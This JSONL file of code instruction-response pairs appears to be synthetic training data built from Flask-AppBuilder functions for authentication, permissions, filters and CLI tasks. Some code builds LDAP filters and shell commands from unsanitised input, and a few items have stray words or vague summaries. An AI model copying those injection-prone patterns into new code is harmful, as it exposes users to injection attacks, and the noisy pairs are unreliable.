{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting page size arguments returns an int racket", "response": "def get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall(\"psize_(.*)\", arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_order_args():\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall(\"_oc_(.*)\", arg)\n        if re_match:\n            order_direction = request.args.get(\"_od_\" + re_match[0])\n            if order_direction in (\"asc\", \"desc\"):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders", "response": "Get order arguments from request. args"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a MetaSchema class for the given model and class_mixin.", "response": "def _meta_schema_factory(self, columns, model, class_mixin):\n        \"\"\"\n            Creates ModelSchema marshmallow-sqlalchemy\n\n        :param columns: a list of columns to mix\n        :param model: Model\n        :param class_mixin: a marshamallow Schema to mix\n        :return: ModelSchema\n        \"\"\"\n        _model = model\n        if columns:\n            class MetaSchema(ModelSchema, class_mixin):\n                class Meta:\n                    model = _model\n                    fields = columns\n                    strict = True\n                    sqla_session = self.datamodel.session\n        else:\n            class MetaSchema(ModelSchema, class_mixin):\n                class Meta:\n                    model = _model\n                    strict = True\n                    sqla_session = self.datamodel.session\n        return MetaSchema"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconverting a list of columns into a Marshmallow ModelSchema.", "response": "def convert(self, columns, model=None, nested=True, enum_dump_by_name=False):\n        \"\"\"\n            Creates a Marshmallow ModelSchema class\n\n\n        :param columns: List with columns to include, if empty converts all on model\n        :param model: Override Model to convert\n        :param nested: Generate relation with nested schemas\n        :return: ModelSchema object\n        \"\"\"\n        super(Model2SchemaConverter, self).convert(\n            columns,\n            model=model,\n            nested=nested\n        )\n\n        class SchemaMixin:\n            pass\n\n        _model = model or self.datamodel.obj\n        _datamodel = self.datamodel.__class__(_model)\n\n        ma_sqla_fields_override = {}\n\n        _columns = list()\n        tree_columns = columns2Tree(columns)\n        for column in tree_columns.root.childs:\n            # Get child model is column is dotted notation\n            ma_sqla_fields_override[column.data] = self._column2field(\n                _datamodel,\n                column,\n                nested,\n                enum_dump_by_name\n            )\n            _columns.append(column.data)\n        for k, v in ma_sqla_fields_override.items():\n            setattr(SchemaMixin, k, v)\n        return self._meta_schema_factory(_columns, _model, SchemaMixin)()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef protect(allow_browser_login=False):\n    def _protect(f):\n        if hasattr(f, '_permission_name'):\n            permission_str = f._permission_name\n        else:\n            permission_str = f.__name__\n\n        def wraps(self, *args, **kwargs):\n            permission_str = \"{}{}\".format(PERMISSION_PREFIX, f._permission_name)\n            class_permission_name = self.__class__.__name__\n            if current_app.appbuilder.sm.is_item_public(\n                    permission_str,\n                    class_permission_name\n            ):\n                return f(self, *args, **kwargs)\n            if not (self.allow_browser_login or allow_browser_login):\n                verify_jwt_in_request()\n            if current_app.appbuilder.sm.has_access(\n                    permission_str,\n                    class_permission_name\n            ):\n                return f(self, *args, **kwargs)\n            elif (self.allow_browser_login or allow_browser_login):\n                verify_jwt_in_request()\n                if current_app.appbuilder.sm.has_access(\n                        permission_str,\n                        class_permission_name\n                ):\n                    return f(self, *args, **kwargs)\n            log.warning(\n                LOGMSG_ERR_SEC_ACCESS_DENIED.format(\n                    permission_str,\n                    class_permission_name\n                )\n            )\n            return self.response_401()\n        f._permission_name = permission_str\n        return functools.update_wrapper(wraps, f)\n    return _protect", "response": "Decorator to protect the user s API methods."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef has_access(f):\n    if hasattr(f, '_permission_name'):\n        permission_str = f._permission_name\n    else:\n        permission_str = f.__name__\n\n    def wraps(self, *args, **kwargs):\n        permission_str = PERMISSION_PREFIX + f._permission_name\n        if self.appbuilder.sm.has_access(\n                permission_str,\n                self.__class__.__name__\n        ):\n            return f(self, *args, **kwargs)\n        else:\n            log.warning(\n                LOGMSG_ERR_SEC_ACCESS_DENIED.format(\n                    permission_str,\n                    self.__class__.__name__\n                )\n            )\n            flash(as_unicode(FLAMSG_ERR_SEC_ACCESS_DENIED), \"danger\")\n        return redirect(\n            url_for(\n                self.appbuilder.sm.auth_view.__class__.__name__ + \".login\",\n                next=request.url\n            )\n        )\n    f._permission_name = permission_str\n    return functools.update_wrapper(wraps, f)", "response": "Decorator to enable granular security permissions to your methods."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef has_access_api(f):\n    if hasattr(f, '_permission_name'):\n        permission_str = f._permission_name\n    else:\n        permission_str = f.__name__\n\n    def wraps(self, *args, **kwargs):\n        permission_str = PERMISSION_PREFIX + f._permission_name\n        if self.appbuilder.sm.has_access(\n                permission_str,\n                self.__class__.__name__\n        ):\n            return f(self, *args, **kwargs)\n        else:\n            log.warning(\n                LOGMSG_ERR_SEC_ACCESS_DENIED.format(\n                    permission_str,\n                    self.__class__.__name__\n                )\n            )\n            response = make_response(\n                jsonify(\n                    {\n                        'message': str(FLAMSG_ERR_SEC_ACCESS_DENIED),\n                        'severity': 'danger'\n                    }\n                ),\n                401\n            )\n            response.headers['Content-Type'] = \"application/json\"\n            return response\n    f._permission_name = permission_str\n    return functools.update_wrapper(wraps, f)", "response": "Decorator to enable granular security permissions to your API methods."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nusing this decorator to expose actions :param name: Action name :param text: Action text. :param confirmation: Confirmation text. If not provided, action will be executed unconditionally. :param icon: Font Awesome icon name :param multiple: If true will display action on list view :param single: If true will display action on show view", "response": "def action(name, text, confirmation=None, icon=None, multiple=True, single=True):\n    \"\"\"\n        Use this decorator to expose actions\n\n        :param name:\n            Action name\n        :param text:\n            Action text.\n        :param confirmation:\n            Confirmation text. If not provided, action will be executed\n            unconditionally.\n        :param icon:\n            Font Awesome icon name\n        :param multiple:\n            If true will display action on list view\n        :param single:\n            If true will display action on show view\n    \"\"\"\n\n    def wrap(f):\n        f._action = (name, text, confirmation, icon, multiple, single)\n        return f\n\n    return wrap"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _oauth_tokengetter(token=None):\n    token = session.get(\"oauth\")\n    log.debug(\"Token Get: {0}\".format(token))\n    return token", "response": "Default function to return the current user oauth token from session cookie."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a custom login manager instance.", "response": "def create_login_manager(self, app) -> LoginManager:\n        \"\"\"\n            Override to implement your custom login manager instance\n\n            :param app: Flask app\n        \"\"\"\n        lm = LoginManager(app)\n        lm.login_view = \"login\"\n        lm.user_loader(self.load_user)\n        return lm"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_jwt_manager(self, app) -> JWTManager:\n        jwt_manager = JWTManager()\n        jwt_manager.init_app(app)\n        jwt_manager.user_loader_callback_loader(self.load_user)\n        return jwt_manager", "response": "Create a custom JWT manager instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_oauth_token_key_name(self, provider):\n        for _provider in self.oauth_providers:\n            if _provider[\"name\"] == provider:\n                return _provider.get(\"token_key\", \"oauth_token\")", "response": "Returns the token_key name for the oauth provider\n           "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_oauth_token_secret_name(self, provider):\n        for _provider in self.oauth_providers:\n            if _provider[\"name\"] == provider:\n                return _provider.get(\"token_secret\", \"oauth_token_secret\")", "response": "Returns the token_secret name for the oauth provider\n            defaults to oauth_secret\n           "}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_oauth_session(self, provider, oauth_response):\n        # Get this provider key names for token_key and token_secret\n        token_key = self.appbuilder.sm.get_oauth_token_key_name(provider)\n        token_secret = self.appbuilder.sm.get_oauth_token_secret_name(provider)\n        # Save users token on encrypted session cookie\n        session[\"oauth\"] = (\n            oauth_response[token_key],\n            oauth_response.get(token_secret, \"\"),\n        )\n        session[\"oauth_provider\"] = provider", "response": "Set the current session with OAuth user secrets"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_oauth_user_info(self, provider, resp):\n        # for GITHUB\n        if provider == \"github\" or provider == \"githublocal\":\n            me = self.appbuilder.sm.oauth_remotes[provider].get(\"user\")\n            log.debug(\"User info from Github: {0}\".format(me.data))\n            return {\"username\": \"github_\" + me.data.get(\"login\")}\n        # for twitter\n        if provider == \"twitter\":\n            me = self.appbuilder.sm.oauth_remotes[provider].get(\"account/settings.json\")\n            log.debug(\"User info from Twitter: {0}\".format(me.data))\n            return {\"username\": \"twitter_\" + me.data.get(\"screen_name\", \"\")}\n        # for linkedin\n        if provider == \"linkedin\":\n            me = self.appbuilder.sm.oauth_remotes[provider].get(\n                \"people/~:(id,email-address,first-name,last-name)?format=json\"\n            )\n            log.debug(\"User info from Linkedin: {0}\".format(me.data))\n            return {\n                \"username\": \"linkedin_\" + me.data.get(\"id\", \"\"),\n                \"email\": me.data.get(\"email-address\", \"\"),\n                \"first_name\": me.data.get(\"firstName\", \"\"),\n                \"last_name\": me.data.get(\"lastName\", \"\"),\n            }\n        # for Google\n        if provider == \"google\":\n            me = self.appbuilder.sm.oauth_remotes[provider].get(\"userinfo\")\n            log.debug(\"User info from Google: {0}\".format(me.data))\n            return {\n                \"username\": \"google_\" + me.data.get(\"id\", \"\"),\n                \"first_name\": me.data.get(\"given_name\", \"\"),\n                \"last_name\": me.data.get(\"family_name\", \"\"),\n                \"email\": me.data.get(\"email\", \"\"),\n            }\n        # for Azure AD Tenant. Azure OAuth response contains\n        # JWT token which has user info.\n        # JWT token needs to be base64 decoded.\n        # https://docs.microsoft.com/en-us/azure/active-directory/develop/\n        # active-directory-protocols-oauth-code\n        if provider == \"azure\":\n            log.debug(\"Azure response received : {0}\".format(resp))\n            id_token = resp[\"id_token\"]\n            log.debug(str(id_token))\n            me = self._azure_jwt_token_parse(id_token)\n            log.debug(\"Parse JWT token : {0}\".format(me))\n            return {\n                \"name\": me[\"name\"],\n                \"email\": me[\"upn\"],\n                \"first_name\": me[\"given_name\"],\n                \"last_name\": me[\"family_name\"],\n                \"id\": me[\"oid\"],\n                \"username\": me[\"oid\"],\n            }\n        else:\n            return {}", "response": "Retrieve user info from OAuth API"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create_db(self):\n        self.add_role(self.auth_role_admin)\n        self.add_role(self.auth_role_public)\n        if self.count_users() == 0:\n            log.warning(LOGMSG_WAR_SEC_NO_USER)", "response": "Setups the DB, creates admin and public roles if they don't exist."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reset_password(self, userid, password):\n        user = self.get_user_by_id(userid)\n        user.password = generate_password_hash(password)\n        self.update_user(user)", "response": "Change or reset a user s password for authdb."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update_user_auth_stat(self, user, success=True):\n        if not user.login_count:\n            user.login_count = 0\n        if not user.fail_login_count:\n            user.fail_login_count = 0\n        if success:\n            user.login_count += 1\n            user.fail_login_count = 0\n        else:\n            user.fail_login_count += 1\n        user.last_login = datetime.datetime.now()\n        self.update_user(user)", "response": "Update the user authentication stat."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nsearch LDAP for user and returns user object", "response": "def _search_ldap(self, ldap, con, username):\n        \"\"\"\n            Searches LDAP for user, assumes ldap_search is set.\n\n            :param ldap: The ldap module reference\n            :param con: The ldap connection\n            :param username: username to match with auth_ldap_uid_field\n            :return: ldap object array\n        \"\"\"\n        if self.auth_ldap_append_domain:\n            username = username + \"@\" + self.auth_ldap_append_domain\n        if self.auth_ldap_search_filter:\n            filter_str = \"(&%s(%s=%s))\" % (\n                self.auth_ldap_search_filter,\n                self.auth_ldap_uid_field,\n                username,\n            )\n        else:\n            filter_str = \"(%s=%s)\" % (self.auth_ldap_uid_field, username)\n        user = con.search_s(\n            self.auth_ldap_search,\n            ldap.SCOPE_SUBTREE,\n            filter_str,\n            [\n                self.auth_ldap_firstname_field,\n                self.auth_ldap_lastname_field,\n                self.auth_ldap_email_field,\n            ],\n        )\n        if user:\n            if not user[0][0]:\n                return None\n        return user"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbind indirect user to the LDAP connection", "response": "def _bind_indirect_user(self, ldap, con):\n        \"\"\"\n            If using AUTH_LDAP_BIND_USER bind this user before performing search\n            :param ldap: The ldap module reference\n            :param con: The ldap connection\n        \"\"\"\n        indirect_user = self.auth_ldap_bind_user\n        if indirect_user:\n            indirect_password = self.auth_ldap_bind_password\n            log.debug(\"LDAP indirect bind with: {0}\".format(indirect_user))\n            con.bind_s(indirect_user, indirect_password)\n            log.debug(\"LDAP BIND indirect OK\")"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef auth_user_ldap(self, username, password):\n        if username is None or username == \"\":\n            return None\n        user = self.find_user(username=username)\n        if user is not None and (not user.is_active):\n            return None\n        else:\n            try:\n                import ldap\n            except Exception:\n                raise Exception(\"No ldap library for python.\")\n            try:\n                if self.auth_ldap_allow_self_signed:\n                    ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_ALLOW)\n                    ldap.set_option(ldap.OPT_X_TLS_NEWCTX, 0)\n                elif self.auth_ldap_tls_demand:\n                    ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_DEMAND)\n                    ldap.set_option(ldap.OPT_X_TLS_NEWCTX, 0)\n                if self.auth_ldap_tls_cacertdir:\n                    ldap.set_option(\n                        ldap.OPT_X_TLS_CACERTDIR, self.auth_ldap_tls_cacertdir\n                    )\n                if self.auth_ldap_tls_cacertfile:\n                    ldap.set_option(\n                        ldap.OPT_X_TLS_CACERTFILE, self.auth_ldap_tls_cacertfile\n                    )\n                if self.auth_ldap_tls_certfile and self.auth_ldap_tls_keyfile:\n                    ldap.set_option(\n                        ldap.OPT_X_TLS_CERTFILE, self.auth_ldap_tls_certfile\n                    )\n                    ldap.set_option(ldap.OPT_X_TLS_KEYFILE, self.auth_ldap_tls_keyfile)\n                con = ldap.initialize(self.auth_ldap_server)\n                con.set_option(ldap.OPT_REFERRALS, 0)\n                if self.auth_ldap_use_tls:\n                    try:\n                        con.start_tls_s()\n                    except Exception:\n                        log.info(\n                            LOGMSG_ERR_SEC_AUTH_LDAP_TLS.format(self.auth_ldap_server)\n                        )\n                        return None\n                # Authenticate user\n                if not self._bind_ldap(ldap, con, username, password):\n                    if user:\n                        self.update_user_auth_stat(user, False)\n                    log.info(LOGMSG_WAR_SEC_LOGIN_FAILED.format(username))\n                    return None\n                # If user does not exist on the DB and not self user registration, go away\n                if not user and not self.auth_user_registration:\n                    return None\n                # User does not exist, create one if self registration.\n                elif not user and self.auth_user_registration:\n                    self._bind_indirect_user(ldap, con)\n                    new_user = self._search_ldap(ldap, con, username)\n                    if not new_user:\n                        log.warning(LOGMSG_WAR_SEC_NOLDAP_OBJ.format(username))\n                        return None\n                    ldap_user_info = new_user[0][1]\n                    if self.auth_user_registration and user is None:\n                        user = self.add_user(\n                            username=username,\n                            first_name=self.ldap_extract(\n                                ldap_user_info, self.auth_ldap_firstname_field, username\n                            ),\n                            last_name=self.ldap_extract(\n                                ldap_user_info, self.auth_ldap_lastname_field, username\n                            ),\n                            email=self.ldap_extract(\n                                ldap_user_info,\n                                self.auth_ldap_email_field,\n                                username + \"@email.notfound\",\n                            ),\n                            role=self.find_role(self.auth_user_registration_role),\n                        )\n\n                self.update_user_auth_stat(user)\n                return user\n\n            except ldap.LDAPError as e:\n                if type(e.message) == dict and \"desc\" in e.message:\n                    log.error(LOGMSG_ERR_SEC_AUTH_LDAP.format(e.message[\"desc\"]))\n                    return None\n                else:\n                    log.error(e)\n                    return None", "response": "Authenticates a user using LDAP"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nauthenticates a user by email", "response": "def auth_user_oid(self, email):\n        \"\"\"\n            OpenID user Authentication\n\n            :param email: user's email to authenticate\n            :type self: User model\n        \"\"\"\n        user = self.find_user(email=email)\n        if user is None or (not user.is_active):\n            log.info(LOGMSG_WAR_SEC_LOGIN_FAILED.format(email))\n            return None\n        else:\n            self.update_user_auth_stat(user)\n            return user"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef auth_user_remote_user(self, username):\n        user = self.find_user(username=username)\n\n        # User does not exist, create one if auto user registration.\n        if user is None and self.auth_user_registration:\n            user = self.add_user(\n                # All we have is REMOTE_USER, so we set\n                # the other fields to blank.\n                username=username,\n                first_name=username,\n                last_name=\"-\",\n                email=\"-\",\n                role=self.find_role(self.auth_user_registration_role),\n            )\n\n        # If user does not exist on the DB and not auto user registration,\n        # or user is inactive, go away.\n        elif user is None or (not user.is_active):\n            log.info(LOGMSG_WAR_SEC_LOGIN_FAILED.format(username))\n            return None\n\n        self.update_user_auth_stat(user)\n        return user", "response": "Authenticates a user on the DB."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nauthenticate a user based on the user information.", "response": "def auth_user_oauth(self, userinfo):\n        \"\"\"\n            OAuth user Authentication\n\n            :userinfo: dict with user information the keys have the same name\n            as User model columns.\n        \"\"\"\n        if \"username\" in userinfo:\n            user = self.find_user(username=userinfo[\"username\"])\n        elif \"email\" in userinfo:\n            user = self.find_user(email=userinfo[\"email\"])\n        else:\n            log.error(\"User info does not have username or email {0}\".format(userinfo))\n            return None\n        # User is disabled\n        if user and not user.is_active:\n            log.info(LOGMSG_WAR_SEC_LOGIN_FAILED.format(userinfo))\n            return None\n        # If user does not exist on the DB and not self user registration, go away\n        if not user and not self.auth_user_registration:\n            return None\n        # User does not exist, create one if self registration.\n        if not user:\n            user = self.add_user(\n                username=userinfo[\"username\"],\n                first_name=userinfo.get(\"first_name\", \"\"),\n                last_name=userinfo.get(\"last_name\", \"\"),\n                email=userinfo.get(\"email\", \"\"),\n                role=self.find_role(self.auth_user_registration_role),\n            )\n            if not user:\n                log.error(\"Error creating a new OAuth user %s\" % userinfo[\"username\"])\n                return None\n        self.update_user_auth_stat(user)\n        return user"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the item is public", "response": "def is_item_public(self, permission_name, view_name):\n        \"\"\"\n            Check if view has public permissions\n\n            :param permission_name:\n                the permission: can_show, can_edit...\n            :param view_name:\n                the name of the class view (child of BaseView)\n        \"\"\"\n        permissions = self.get_public_permissions()\n        if permissions:\n            for i in permissions:\n                if (view_name == i.view_menu.name) and (\n                    permission_name == i.permission.name\n                ):\n                    return True\n            return False\n        else:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking if user has access to view or menu", "response": "def has_access(self, permission_name, view_name):\n        \"\"\"\n            Check if current user or public has access to view or menu\n        \"\"\"\n        if current_user.is_authenticated:\n            return self._has_view_access(g.user, permission_name, view_name)\n        elif current_user_jwt:\n            return self._has_view_access(current_user_jwt, permission_name, view_name)\n        else:\n            return self.is_item_public(permission_name, view_name)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning all current user permissions on a certain view", "response": "def get_user_permissions_on_view(view_name):\n        \"\"\"\n            Returns all current user permissions\n             on a certain view/resource\n        :param view_name: The name of the view/resource/menu\n        :return: (list) with permissions\n        \"\"\"\n        _ret = list()\n        if current_user.is_authenticated:\n            _current_user = current_user\n        elif current_user_jwt:\n            _current_user = current_user_jwt\n        else:\n            return _ret\n        for role in _current_user.roles:\n            if role.permissions:\n                for permission in role.permissions:\n                    if permission.view_menu.name == view_name:\n                        _ret.append(permission.permission.name)\n        return _ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef add_permissions_view(self, base_permissions, view_menu):\n        view_menu_db = self.add_view_menu(view_menu)\n        perm_views = self.find_permissions_view_menu(view_menu_db)\n\n        if not perm_views:\n            # No permissions yet on this view\n            for permission in base_permissions:\n                pv = self.add_permission_view_menu(permission, view_menu)\n                role_admin = self.find_role(self.auth_role_admin)\n                self.add_permission_role(role_admin, pv)\n        else:\n            # Permissions on this view exist but....\n            role_admin = self.find_role(self.auth_role_admin)\n            for permission in base_permissions:\n                # Check if base view permissions exist\n                if not self.exist_permission_on_views(perm_views, permission):\n                    pv = self.add_permission_view_menu(permission, view_menu)\n                    self.add_permission_role(role_admin, pv)\n            for perm_view in perm_views:\n                if perm_view.permission.name not in base_permissions:\n                    # perm to delete\n                    roles = self.get_all_roles()\n                    perm = self.find_permission(perm_view.permission.name)\n                    # del permission from all roles\n                    for role in roles:\n                        self.del_permission_role(role, perm)\n                    self.del_permission_view_menu(perm_view.permission.name, view_menu)\n                elif perm_view not in role_admin.permissions:\n                    # Role Admin must have all permissions\n                    self.add_permission_role(role_admin, perm_view)", "response": "Adds a permission on a view menu to the backend."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nadding menu_access to menu on permission_view_menu_nymced.", "response": "def add_permissions_menu(self, view_menu_name):\n        \"\"\"\n            Adds menu_access to menu on permission_view_menu\n\n            :param view_menu_name:\n                The menu name\n        \"\"\"\n        self.add_view_menu(view_menu_name)\n        pv = self.find_permission_view_menu(\"menu_access\", view_menu_name)\n        if not pv:\n            pv = self.add_permission_view_menu(\"menu_access\", view_menu_name)\n            role_admin = self.find_role(self.auth_role_admin)\n            self.add_permission_role(role_admin, pv)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef security_cleanup(self, baseviews, menus):\n        viewsmenus = self.get_all_view_menu()\n        roles = self.get_all_roles()\n        for viewmenu in viewsmenus:\n            found = False\n            for baseview in baseviews:\n                if viewmenu.name == baseview.__class__.__name__:\n                    found = True\n                    break\n            if menus.find(viewmenu.name):\n                found = True\n            if not found:\n                permissions = self.find_permissions_view_menu(viewmenu)\n                for permission in permissions:\n                    for role in roles:\n                        self.del_permission_role(role, permission)\n                    self.del_permission_view_menu(\n                        permission.permission.name, viewmenu.name\n                    )\n                self.del_view_menu(viewmenu.name)", "response": "This function will cleanup all unused permissions from the database and all baseviews and menus."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef greeting2(self):\n        if request.method == \"GET\":\n            return self.response(200, message=\"Hello (GET)\")\n        return self.response(201, message=\"Hello (POST)\")", "response": "Send a greeting to a user"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rest_add_filters(self, data):\n        for _filter in data:\n            filter_class = map_args_filter.get(_filter[\"opr\"], None)\n            if filter_class:\n                self.add_filter(_filter[\"col\"], filter_class, _filter[\"value\"])", "response": "Adds list of dicts\n            to the list of filters"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a new filters class with active filters joined", "response": "def get_joined_filters(self, filters):\n        \"\"\"\n            Creates a new filters class with active filters joined\n        \"\"\"\n        retfilters = Filters(self.filter_converter, self.datamodel)\n        retfilters.filters = self.filters + filters.filters\n        retfilters.values = self.values + filters.values\n        return retfilters"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a copy of this object containing only the copy of the object", "response": "def copy(self):\n        \"\"\"\n            Returns a copy of this object\n\n            :return: A copy of self\n        \"\"\"\n        retfilters = Filters(self.filter_converter, self.datamodel)\n        retfilters.filters = copy.copy(self.filters)\n        retfilters.values = copy.copy(self.values)\n        return retfilters"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_relation_cols(self):\n        retlst = []\n        for flt, value in zip(self.filters, self.values):\n            if isinstance(flt, FilterRelation) and value:\n                retlst.append(flt.column_name)\n        return retlst", "response": "Returns the list of columns that are active in the relation"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of tuples where the first element is the FILTER and the second is the VALUE.", "response": "def get_filters_values(self):\n        \"\"\"\n            Returns a list of tuples [(FILTER, value),(...,...),....]\n        \"\"\"\n        return [(flt, value) for flt, value in zip(self.filters, self.values)]"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the value of a certain column in the database", "response": "def get_filter_value(self, column_name):\n        \"\"\"\n            Returns the filtered value for a certain column\n\n            :param column_name: The name of the column that we want the value from\n            :return: the filter value of the column\n        \"\"\"\n        for flt, value in zip(self.filters, self.values):\n            if flt.column_name == column_name:\n                return value"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find(self, name, menu=None):\n        menu = menu or self.menu\n        for i in menu:\n            if i.name == name:\n                return i\n            else:\n                if i.childs:\n                    ret_item = self.find(name, menu=i.childs)\n                    if ret_item:\n                        return ret_item", "response": "Finds a menu item by name and returns it."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating all your database objects.", "response": "def create_db():\n    \"\"\"\n        Create all your database objects (SQLAlchemy specific).\n    \"\"\"\n    from flask_appbuilder.models.sqla import Model\n\n    engine = current_app.appbuilder.get_session.get_bind(mapper=None, clause=None)\n    Model.metadata.create_all(engine)\n    click.echo(click.style(\"DB objects created\", fg=\"green\"))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef version():\n    click.echo(\n        click.style(\n            \"F.A.B Version: {0}.\".format(current_app.appbuilder.version),\n            bg=\"blue\",\n            fg=\"white\"\n        )\n    )", "response": "A function that prints the version of the application."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create_permissions():\n    current_app.appbuilder.add_permissions(update_perms=True)\n    click.echo(click.style(\"Created all permissions\", fg=\"green\"))", "response": "Create all permissions and add them to the ADMIN Role."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list_views():\n    echo_header(\"List of registered views\")\n    for view in current_app.appbuilder.baseviews:\n        click.echo(\n            \"View:{0} | Route:{1} | Perms:{2}\".format(\n                view.__class__.__name__, view.route_base, view.base_permissions\n            )\n        )", "response": "List all registered views"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_users():\n    echo_header(\"List of users\")\n    for user in current_app.appbuilder.sm.get_all_users():\n        click.echo(\n            \"username:{0} | email:{1} | role:{2}\".format(\n                user.username, user.email, user.roles\n            )\n        )", "response": "List all users on the database"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create_app(name, engine):\n    try:\n        if engine.lower() == \"sqlalchemy\":\n            url = urlopen(SQLA_REPO_URL)\n            dirname = \"Flask-AppBuilder-Skeleton-master\"\n        elif engine.lower() == \"mongoengine\":\n            url = urlopen(MONGOENGIE_REPO_URL)\n            dirname = \"Flask-AppBuilder-Skeleton-me-master\"\n        zipfile = ZipFile(BytesIO(url.read()))\n        zipfile.extractall()\n        os.rename(dirname, name)\n        click.echo(click.style(\"Downloaded the skeleton app, good coding!\", fg=\"green\"))\n        return True\n    except Exception as e:\n        click.echo(click.style(\"Something went wrong {0}\".format(e), fg=\"red\"))\n        if engine.lower() == \"sqlalchemy\":\n            click.echo(\n                click.style(\n                    \"Try downloading from {0}\".format(SQLA_REPO_URL), fg=\"green\"\n                )\n            )\n        elif engine.lower() == \"mongoengine\":\n            click.echo(\n                click.style(\n                    \"Try downloading from {0}\".format(MONGOENGIE_REPO_URL), fg=\"green\"\n                )\n            )\n        return False", "response": "Create a skeleton application"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_addon(name):\n    try:\n        full_name = \"fab_addon_\" + name\n        dirname = \"Flask-AppBuilder-Skeleton-AddOn-master\"\n        url = urlopen(ADDON_REPO_URL)\n        zipfile = ZipFile(BytesIO(url.read()))\n        zipfile.extractall()\n        os.rename(dirname, full_name)\n        addon_path = os.path.join(full_name, full_name)\n        os.rename(os.path.join(full_name, \"fab_addon\"), addon_path)\n        f = open(os.path.join(full_name, \"config.py\"), \"w\")\n        f.write(\"ADDON_NAME='\" + name + \"'\\n\")\n        f.write(\"FULL_ADDON_NAME='fab_addon_' + ADDON_NAME\\n\")\n        f.close()\n        click.echo(\n            click.style(\"Downloaded the skeleton addon, good coding!\", fg=\"green\")\n        )\n        return True\n    except Exception as e:\n        click.echo(click.style(\"Something went wrong {0}\".format(e), fg=\"red\"))\n        return False", "response": "Create a skeleton AddOn"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef babel_extract(config, input, output, target, keywords):\n    click.echo(\n        click.style(\n            \"Starting Extractions config:{0} input:{1} output:{2} keywords:{3}\".format(\n                config, input, output, keywords\n            ),\n            fg=\"green\",\n        )\n    )\n    keywords = \" -k \".join(keywords)\n    os.popen(\n        \"pybabel extract -F {0} -k {1} -o {2} {3}\".format(\n            config, keywords, output, input\n        )\n    )\n    click.echo(click.style(\"Starting Update target:{0}\".format(target), fg=\"green\"))\n    os.popen(\"pybabel update -N -i {0} -d {1}\".format(output, target))\n    click.echo(click.style(\"Finish, you can start your translations\", fg=\"green\"))", "response": "Babel Extracts and updates all messages marked for translation"}
